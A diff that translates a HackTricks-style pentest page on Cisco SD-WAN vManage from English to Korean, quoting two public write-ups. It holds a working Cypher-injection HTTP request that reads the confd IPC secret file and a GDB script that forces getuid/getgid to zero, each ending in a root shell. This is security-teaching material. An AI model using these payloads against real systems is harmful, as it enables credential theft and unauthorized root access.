@@ -6,16 +6,13 @@
 
 (Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:
-
+조금 더 파고들어 `confd` 및 다양한 바이너리와 관련된 [문서](http://66.218.245.39/doc/html/rn03re18.html)를 살펴본 결과, IPC 소켓을 인증하기 위해 `/etc/confd/confd_ipc_secret`에 위치한 비밀을 사용한다는 것을 발견했습니다:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-
-Remember our Neo4j instance? It is running under the `vmanage` user's privileges, thus allowing us to retrieve the file using the previous vulnerability:
-
+우리의 Neo4j 인스턴스를 기억하나요? `vmanage` 사용자의 권한으로 실행되고 있어, 이전 취약점을 사용하여 파일을 검색할 수 있습니다:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -27,9 +24,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-
-The `confd_cli` program does not support command line arguments but calls `/usr/bin/confd_cli_user` with arguments. So, we could directly call `/usr/bin/confd_cli_user` with our own set of arguments. However it's not readable with our current privileges, so we have to retrieve it from the rootfs and copy it using scp, read the help, and use it to get the shell:
-
+`confd_cli` 프로그램은 명령줄 인수를 지원하지 않지만 인수와 함께 `/usr/bin/confd_cli_user`를 호출합니다. 따라서 우리는 자신의 인수 집합으로 `/usr/bin/confd_cli_user`를 직접 호출할 수 있습니다. 그러나 현재 권한으로는 읽을 수 없으므로 rootfs에서 이를 검색하고 scp를 사용하여 복사한 후, 도움말을 읽고 이를 사용하여 셸을 얻어야 합니다:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -47,15 +42,13 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-
 ## Path 2
 
 (Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-The blog¹ by the synacktiv team described an elegant way to get a root shell, but the caveat is it requires getting a copy of the `/usr/bin/confd_cli_user` which is only readable by root. I found another way to escalate to root without such hassle.
+synacktiv 팀의 블로그¹는 루트 셸을 얻는 우아한 방법을 설명했지만, 단점은 `/usr/bin/confd_cli_user`의 복사본을 얻어야 하며 이는 루트만 읽을 수 있습니다. 나는 이러한 번거로움 없이 루트로 상승하는 또 다른 방법을 찾았습니다.
 
-When I disassembled `/usr/bin/confd_cli` binary, I observed the following:
-
+`/usr/bin/confd_cli` 바이너리를 분해했을 때, 나는 다음과 같은 것을 관찰했습니다:
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -84,46 +77,40 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-
-When I run “ps aux”, I observed the following (_note -g 100 -u 107_)
-
+“ps aux”를 실행했을 때, 다음을 관찰했습니다 (_note -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
+나는 “confd_cli” 프로그램이 로그인한 사용자로부터 수집한 사용자 ID와 그룹 ID를 “cmdptywrapper” 애플리케이션에 전달한다고 가정했다.
 
-I hypothesized the “confd_cli” program passes the user ID and group ID it collected from the logged in user to the “cmdptywrapper” application.
+내 첫 번째 시도는 “cmdptywrapper”를 직접 실행하고 `-g 0 -u 0`을 제공하는 것이었지만 실패했다. 어딘가에서 파일 설명자(-i 1015)가 생성된 것 같고, 이를 위조할 수 없다.
 
-My first attempt was to run the “cmdptywrapper” directly and supplying it with `-g 0 -u 0`, but it failed. It appears a file descriptor (-i 1015) was created somewhere along the way and I cannot fake it.
+synacktiv의 블로그(마지막 예제)에서 언급했듯이, `confd_cli` 프로그램은 명령줄 인수를 지원하지 않지만, 디버거를 통해 영향을 줄 수 있으며, 다행히 GDB가 시스템에 포함되어 있다.
 
-As mentioned in synacktiv’s blog(last example), the `confd_cli` program does not support command line argument, but I can influence it with a debugger and fortunately GDB is included on the system.
-
-I created a GDB script where I forced the API `getuid` and `getgid` to return 0. Since I already have “vmanage” privilege through the deserialization RCE, I have permission to read the `/etc/confd/confd_ipc_secret` directly.
+나는 API `getuid`와 `getgid`가 0을 반환하도록 강제하는 GDB 스크립트를 만들었다. 이미 deserialization RCE를 통해 “vmanage” 권한을 가지고 있으므로, `/etc/confd/confd_ipc_secret`를 직접 읽을 수 있는 권한이 있다.
 
 root.gdb:
-
 ```
 set environment USER=root
 define root
-   finish
-   set $rax=0
-   continue
+finish
+set $rax=0
+continue
 end
 break getuid
 commands
-   root
+root
 end
 break getgid
 commands
-   root
+root
 end
 run
 ```
-
-Console Output:
-
+콘솔 출력:
 ```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -157,5 +144,4 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
